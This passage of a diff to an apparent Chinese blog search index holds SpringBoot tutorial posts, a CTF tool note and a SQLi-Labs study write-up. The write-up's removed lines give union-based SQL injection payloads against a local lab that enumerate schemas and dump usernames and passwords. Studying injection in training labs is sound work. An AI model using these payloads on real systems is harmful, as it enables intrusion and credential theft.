</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//要拦截user下的所有访问请求，必须用户登录后才能访问</span></span><br><span class="line">        String[] addPathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/**&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//排除路径，排除的路径说明不需要用户登录也可以访问</span></span><br><span class="line">        String[] excludePathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/out&quot;</span>,<span class="string">&quot;/user/error&quot;</span>,<span class="string">&quot;/user/login&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> UserInterceptor()).addPathPatterns(addPathPatterns).excludePathPatterns(excludePathPatterns);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>　　需要实现WebMvcConfigurer，重写addInterceptors方法，在里面配置需要拦截的请求和排除的请求。</p>
-<h2 id="1-3-编写Controller类进行验证"><a href="#1-3-编写Controller类进行验证" class="headerlink" title="1.3 编写Controller类进行验证"></a>1.3 编写Controller类进行验证</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span>&#123;</span><br><span class="line">        <span class="comment">//将user用户存入session</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setId(<span class="number">1001</span>);</span><br><span class="line">        user.setUsername(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        request.getSession().setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login SUCCESS&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//登录成功才能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/center&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">center</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Center Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不用登录就能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/out&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Out Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果用户未登录访问了需要登录才可访问的请求，才会出错</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/error&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">error</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-在SpringBoot框架下使用Servlet"><a href="#2-在SpringBoot框架下使用Servlet" class="headerlink" title="2.在SpringBoot框架下使用Servlet"></a>2.在SpringBoot框架下使用Servlet</h1><ul>
-<li><p>第一种方式</p>
-<p>在主程序入口处加上@ServletComponentScan注解，然后正常使用@WebServlet注解</p>
-</li>
-<li><p>第二种方式</p>
-<p>使用@Configuration注解定义一个配置类</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>SpringBoot学习</category>
-      </categories>
-      <tags>
-        <tag>SpringBoot学习</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SpringBoot-请求方式注解</title>
     <url>/post/6cd03ce5.html</url>
     <content><![CDATA[<p>　　主要是在开发过程中，如何区别各种请求类型，还有RESTful风格的了解<a id="more"></a></p>
@@ -1264,6 +1235,35 @@
 <li><p>student1需要加@GetMapping、student2需要加@DeleteMapping</p>
 </li>
 <li><p>修改请求路径顺序</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>SpringBoot学习</category>
+      </categories>
+      <tags>
+        <tag>SpringBoot学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SpringBoot-拦截器</title>
+    <url>/post/e3a97206.html</url>
+    <content><![CDATA[<p>　　SpringBoot学习，主要内容是拦截器，可以实现网站的登录功能<a id="more"></a></p>
+<h1 id="1-实现登录拦截"><a href="#1-实现登录拦截" class="headerlink" title="1.实现登录拦截"></a>1.实现登录拦截</h1><p>　　首先需要编写相应模块的类实现HandlerInterceptor，然后再拦截配置类里面编辑要拦截胡页面。</p>
+<h2 id="1-1-编写类实现HandlerInterceptor类"><a href="#1-1-编写类实现HandlerInterceptor类" class="headerlink" title="1.1 编写类实现HandlerInterceptor类"></a>1.1 编写类实现HandlerInterceptor类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//编写业务拦截的规则</span></span><br><span class="line">        <span class="comment">//从session中获取用户的信息</span></span><br><span class="line">        User user = (User) request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断用户是否登录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == user) &#123;</span><br><span class="line">            <span class="comment">//未登录</span></span><br><span class="line">            response.sendRedirect(request.getContextPath() + <span class="string">&quot;/nologin&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>　　实现HanderInterceptor，重写preHandle、postHandle、afterCompletion三个方法，先获取session的用户信息，然后判断是否登录。</p>
+<h2 id="1-2-声明拦截配置类"><a href="#1-2-声明拦截配置类" class="headerlink" title="1.2 声明拦截配置类"></a>1.2 声明拦截配置类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//定义此类为配置文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterceptorConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//要拦截user下的所有访问请求，必须用户登录后才能访问</span></span><br><span class="line">        String[] addPathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/**&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//排除路径，排除的路径说明不需要用户登录也可以访问</span></span><br><span class="line">        String[] excludePathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/out&quot;</span>,<span class="string">&quot;/user/error&quot;</span>,<span class="string">&quot;/user/login&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> UserInterceptor()).addPathPatterns(addPathPatterns).excludePathPatterns(excludePathPatterns);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>　　需要实现WebMvcConfigurer，重写addInterceptors方法，在里面配置需要拦截的请求和排除的请求。</p>
+<h2 id="1-3-编写Controller类进行验证"><a href="#1-3-编写Controller类进行验证" class="headerlink" title="1.3 编写Controller类进行验证"></a>1.3 编写Controller类进行验证</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span>&#123;</span><br><span class="line">        <span class="comment">//将user用户存入session</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setId(<span class="number">1001</span>);</span><br><span class="line">        user.setUsername(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        request.getSession().setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login SUCCESS&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//登录成功才能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/center&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">center</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Center Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不用登录就能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/out&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Out Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果用户未登录访问了需要登录才可访问的请求，才会出错</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/error&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">error</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-在SpringBoot框架下使用Servlet"><a href="#2-在SpringBoot框架下使用Servlet" class="headerlink" title="2.在SpringBoot框架下使用Servlet"></a>2.在SpringBoot框架下使用Servlet</h1><ul>
+<li><p>第一种方式</p>
+<p>在主程序入口处加上@ServletComponentScan注解，然后正常使用@WebServlet注解</p>
+</li>
+<li><p>第二种方式</p>
+<p>使用@Configuration注解定义一个配置类</p>
 </li>
 </ul>
 ]]></content>
@@ -1375,78 +1375,6 @@
 ]]></content>
       <categories>
         <category>SpringBoot学习</category>
-      </categories>
-      <tags>
-        <tag>SpringBoot学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SpringBoot注解</title>
-    <url>/post/2f294b8e.html</url>
-    <content><![CDATA[<p>　　在开发过程中经常用到的注解<a id="more"></a></p>
-<h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><table>
-<thead>
-<tr>
-<th>注解</th>
-<th align="left">作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>@Controller注解</td>
-<td align="left">用于定义控制器类，在spring项目中由控制器负责将用户发来的URL请求转发到对应的服务接口（service层），一般这个注解在类中，通常方法需要配合注解@RequestMapping。</td>
-</tr>
-<tr>
-<td>@RequestMapping注解</td>
-<td align="left">@RequestMapping(“/path”)表示该控制器处理所有“/path”的UR L请求。RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。</td>
-</tr>
-<tr>
-<td>@ResponseBody注解</td>
-<td align="left">直接写入HTTP response body中。比如异步获取json数据，加上@Responsebody后，会直接返回json数据。该注解一般会配合@RequestMapping一起使用。</td>
-</tr>
-<tr>
-<td>@Conponent注解</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td>@ConfigurationProperties注解</td>
-<td align="left">加入前缀区分properties文件获取的值</td>
-</tr>
-<tr>
-<td>@Autowired注解</td>
-<td align="left">注解导入。可以自动收集所有的Spring组件，包括@Configuration类。我们经常使用@ComponentScan注解搜索beans，并结合@Autowired注解导入。如果没有配置的话，Spring Boot会扫描启动类所在包下以及子包下的使用了@Service,@Repository等注解的类。</td>
-</tr>
-<tr>
-<td>@Service注解</td>
-<td align="left"></td>
-</tr>
-<tr>
-<td>@Mapper注解</td>
-<td align="left">扫描DAO接口到Spring容器</td>
-</tr>
-<tr>
-<td>@MapperScan注解</td>
-<td align="left">开启扫描Mapper接口的包以及子目录</td>
-</tr>
-<tr>
-<td>@Transactional注解</td>
-<td align="left">事务管理器</td>
-</tr>
-<tr>
-<td>@RestController注解</td>
-<td align="left">相当于控制层类加上@Controller+方法上加@ResponseBody ，意味着当前控制层类中所有方法返还的都是JSON对象</td>
-</tr>
-<tr>
-<td>@Bean注解</td>
-<td align="left">主要在配置类中，相当于&lt;beans&gt;&lt;bean id=”” class=””&gt;&lt;/beans&gt;</td>
-</tr>
-<tr>
-<td></td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>SpringBoot框架</category>
       </categories>
       <tags>
         <tag>SpringBoot学习</tag>
@@ -1653,6 +1581,78 @@
       </tags>
   </entry>
   <entry>
+    <title>SpringBoot注解</title>
+    <url>/post/2f294b8e.html</url>
+    <content><![CDATA[<p>　　在开发过程中经常用到的注解<a id="more"></a></p>
+<h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><table>
+<thead>
+<tr>
+<th>注解</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>@Controller注解</td>
+<td align="left">用于定义控制器类，在spring项目中由控制器负责将用户发来的URL请求转发到对应的服务接口（service层），一般这个注解在类中，通常方法需要配合注解@RequestMapping。</td>
+</tr>
+<tr>
+<td>@RequestMapping注解</td>
+<td align="left">@RequestMapping(“/path”)表示该控制器处理所有“/path”的UR L请求。RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。</td>
+</tr>
+<tr>
+<td>@ResponseBody注解</td>
+<td align="left">直接写入HTTP response body中。比如异步获取json数据，加上@Responsebody后，会直接返回json数据。该注解一般会配合@RequestMapping一起使用。</td>
+</tr>
+<tr>
+<td>@Conponent注解</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td>@ConfigurationProperties注解</td>
+<td align="left">加入前缀区分properties文件获取的值</td>
+</tr>
+<tr>
+<td>@Autowired注解</td>
+<td align="left">注解导入。可以自动收集所有的Spring组件，包括@Configuration类。我们经常使用@ComponentScan注解搜索beans，并结合@Autowired注解导入。如果没有配置的话，Spring Boot会扫描启动类所在包下以及子包下的使用了@Service,@Repository等注解的类。</td>
+</tr>
+<tr>
+<td>@Service注解</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td>@Mapper注解</td>
+<td align="left">扫描DAO接口到Spring容器</td>
+</tr>
+<tr>
+<td>@MapperScan注解</td>
+<td align="left">开启扫描Mapper接口的包以及子目录</td>
+</tr>
+<tr>
+<td>@Transactional注解</td>
+<td align="left">事务管理器</td>
+</tr>
+<tr>
+<td>@RestController注解</td>
+<td align="left">相当于控制层类加上@Controller+方法上加@ResponseBody ，意味着当前控制层类中所有方法返还的都是JSON对象</td>
+</tr>
+<tr>
+<td>@Bean注解</td>
+<td align="left">主要在配置类中，相当于&lt;beans&gt;&lt;bean id=”” class=””&gt;&lt;/beans&gt;</td>
+</tr>
+<tr>
+<td></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>SpringBoot框架</category>
+      </categories>
+      <tags>
+        <tag>SpringBoot学习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS攻击</title>
     <url>/post/4fa736d8.html</url>
     <content><![CDATA[<p>　　通过DVWA学习这个挺好<a id="more"></a></p>
@@ -1704,26 +1704,6 @@
       </tags>
   </entry>
   <entry>
-    <title>cloacked-pixel艰难使用</title>
-    <url>/post/387a909.html</url>
-    <content><![CDATA[<p>python2下载安装，安装成功后，尝试使用<a id="more"></a></p>
-<p><img src="https://s3.ax1x.com/2020/11/28/DyZcfU.jpg" alt="DyZcfU.jpg"></p>
-<p>见到没有这个包</p>
-<p>之后开始安装缺少的包</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">pip2 install numpy -i https:<span class="regexp">//</span>pypi.tuna.tsinghua.edu.cn<span class="regexp">/simple/</span></span><br></pre></td></tr></table></figure>
-
-<p>[<img src="https://s3.ax1x.com/2020/11/28/DyZW6J.jpg" alt="DyZW6J.jpg"></p>
-<p>最后终于能够成功使用，拿到flag</p>
-<p><img src="https://s3.ax1x.com/2020/11/28/DyZ6YT.jpg" alt="DyZ6YT.jpg"></p>
-]]></content>
-      <categories>
-        <category>第一届DMCTF夺旗赛</category>
-      </categories>
-      <tags>
-        <tag>cloacked-pixel</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XXE攻击</title>
     <url>/post/16c3837a.html</url>
     <content><![CDATA[<p>　　XML语言，还是不能够理解<a id="more"></a></p>
@@ -1745,6 +1725,26 @@
       </categories>
       <tags>
         <tag>XXE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cloacked-pixel艰难使用</title>
+    <url>/post/387a909.html</url>
+    <content><![CDATA[<p>python2下载安装，安装成功后，尝试使用<a id="more"></a></p>
+<p><img src="https://s3.ax1x.com/2020/11/28/DyZcfU.jpg" alt="DyZcfU.jpg"></p>
+<p>见到没有这个包</p>
+<p>之后开始安装缺少的包</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">pip2 install numpy -i https:<span class="regexp">//</span>pypi.tuna.tsinghua.edu.cn<span class="regexp">/simple/</span></span><br></pre></td></tr></table></figure>
+
+<p>[<img src="https://s3.ax1x.com/2020/11/28/DyZW6J.jpg" alt="DyZW6J.jpg"></p>
+<p>最后终于能够成功使用，拿到flag</p>
+<p><img src="https://s3.ax1x.com/2020/11/28/DyZ6YT.jpg" alt="DyZ6YT.jpg"></p>
+]]></content>
+      <categories>
+        <category>第一届DMCTF夺旗赛</category>
+      </categories>
+      <tags>
+        <tag>cloacked-pixel</tag>
       </tags>
   </entry>
   <entry>
@@ -2226,119 +2226,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sql注入学习</title>
-    <url>/post/6d789c72.html</url>
-    <content><![CDATA[<p>　　这个漏洞以后再写项目的时候必须注意<a id="more"></a></p>
-<h1 id="SQLI-Labs简介"><a href="#SQLI-Labs简介" class="headerlink" title="SQLI-Labs简介"></a>SQLI-Labs简介</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>　　通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
-<h2 id="2-sql注入类型"><a href="#2-sql注入类型" class="headerlink" title="2.sql注入类型"></a>2.sql注入类型</h2><p>按照注入点类型来分类</p>
-<h3 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h3><p>sql语句为<code>select * from table_name where id = x</code></p>
-<p>这种类型可以使用and 1=1 和 and 1=2判断：</p>
-<p>​        1.url地址中输入id=x and 1=1页面正常回显</p>
-<p>​        2.url地址中输入id=x and 1=2页面回显不正常，则属于该类型</p>
-<p>原因：</p>
-<p>当输入and 1=1时，执行的sql语句：<code>selece * from table_name where id=x and 1=1</code>，没有逻辑错误，返回正常</p>
-<p>当输入and 1=2时，执行的sql语句：<code>selece * from table_name where id=x and 1=2</code></p>
-<p>如果是字符型注入，则应该是以下情况</p>
-<p>1）<code>selece * from table_name where &#39;id=x and 1=1&#39;</code></p>
-<p>2）<code>selece * from table_name where &#39;id=x and 1=2&#39;</code></p>
-<p>引号里面的被转换为字符串，没有进行逻辑判断，不会出现上述结果，所以这种情况不成立。</p>
-<h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>　　当输入的参数x为字符型时，执行的sql语句：<code>select * from table_name where id=&#39;x&#39;</code></p>
-<p>同样可以用and ‘1’=’1和and ‘1’=’2判断：</p>
-<p>​        1.url地址输入id=x’ and ‘1’=’1页面正常，继续下一步</p>
-<p>​        2.url地址中继续输入id=x’ and ‘1’=’2页面错误，则为字符型注入</p>
-<p>原因：</p>
-<p>当输入id=x’ and ‘1’=’1时，执行的sql语句：<code>select * from table_name where id=&#39;x&#39; and &#39;1&#39;=&#39;1&#39;</code></p>
-<p>语法正确，逻辑正确，所以返回正确</p>
-<p>当输入and ‘1’=’2，执行的sql语句：<code>select * from table_name where id=&#39;x&#39; and &#39;1&#39;=&#39;2&#39;</code></p>
-<p>语法正确，但是逻辑判断错误</p>
-<h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>　　这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code>。</p>
-<p>组合出来的sql注入语句为：<code>select * from news where search like &#39;%测试 %&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p>
-<p>测试%’ union select 1,2,3,4 and ‘%’=’</p>
-<p>按照数据提交的方式来分类</p>
-<p>（1）GET 注入</p>
-<p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
-<p>（2）POST 注入</p>
-<p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
-<p>（3）Cookie 注入</p>
-<p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
-<p>（4）HTTP 头部注入</p>
-<p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
-<p>按照执行效果来分类</p>
-<p>（1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</p>
-<p>（2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
-<p>（3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
-<p>*（4）联合查询注入，可以使用union的情况下的注入。</p>
-<p>*（5）堆查询注入，可以同时执行多条语句的执行时的注入。</p>
-<h1 id="SQLI-LABS学习"><a href="#SQLI-LABS学习" class="headerlink" title="SQLI-LABS学习"></a>SQLI-LABS学习</h1><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>首先说一下我在学习过程中经常弄混淆的一些单词</p>
-<p>table_schema：数据库名</p>
-<p>information_schema.schemata：所有的数据库中</p>
-<p>information_schema.tables：该数据库中的所有表</p>
-<p>information_schema.column：该表中的所有列</p>
-<p>table_name：表名</p>
-<p>column_name：列名</p>
-<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>– （这里有一个空格）在sql语句中表示注释，但是在url中，如果在最后一行加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用–+代替，因为+在URL被编码后会变成空格。</p>
-<p>1.输入<code>http://127.0.0.1/sqli/Less-1/?id=1</code>，页面回显正常，所以改地方不是数值查询。<br><img src="https://img-blog.csdnimg.cn/20201027175301124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
-<p>2.在id后面加上’，页面回显不正常，可能存在字符注入<br><img src="https://img-blog.csdnimg.cn/20201027175440385.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>3.输入–+将sql后面的语句注释掉，页面回显正常，说明是单引号字符型注入<br><img src="https://img-blog.csdnimg.cn/20201027175502223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>4.接着使用order by语句判断该数据库有几列输入，order by 4、order by 5、order by 6···页面都回显错误，只有order by 3正常，说明该表有3列<br><img src="https://img-blog.csdnimg.cn/20201027175622660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>5.将id=1改成id=-1，然后使用union select 1,2,3联合查询语句查询是否有显示位。显示2和3，表明有2个显示位，说明第2列和第3列可以显示信息。<br><img src="https://img-blog.csdnimg.cn/20201027180119978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>6.然后利用sql查询语句爆破出数据库的库名，表名，列名，字段信息：<br>库名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code><br><img src="https://img-blog.csdnimg.cn/20201027182524974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>表名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code><br>这里0x7365637572697479是查询的库名security的16进制<br><img src="https://img-blog.csdnimg.cn/20201027182008418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>users表中的列名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code><br><img src="https://img-blog.csdnimg.cn/20201027182640634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>接着使用一下语句查询账号密码<br><code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users--+ </code><br><img src="https://img-blog.csdnimg.cn/20201027182951559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>第二关和第一关是一个类型的</p>
-<p>1.输入id=1回显正常</p>
-<p>2.id=1’出错，可以见是单引号闭合出错</p>
-<p>3.之后继续按照第一关的步骤进行爆破信息</p>
-<h2 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2><p>1.和之前一样输入</p>
-<p><img src="https://s1.ax1x.com/2020/11/09/BHiUhV.png" alt="BHiUhV.png"></p>
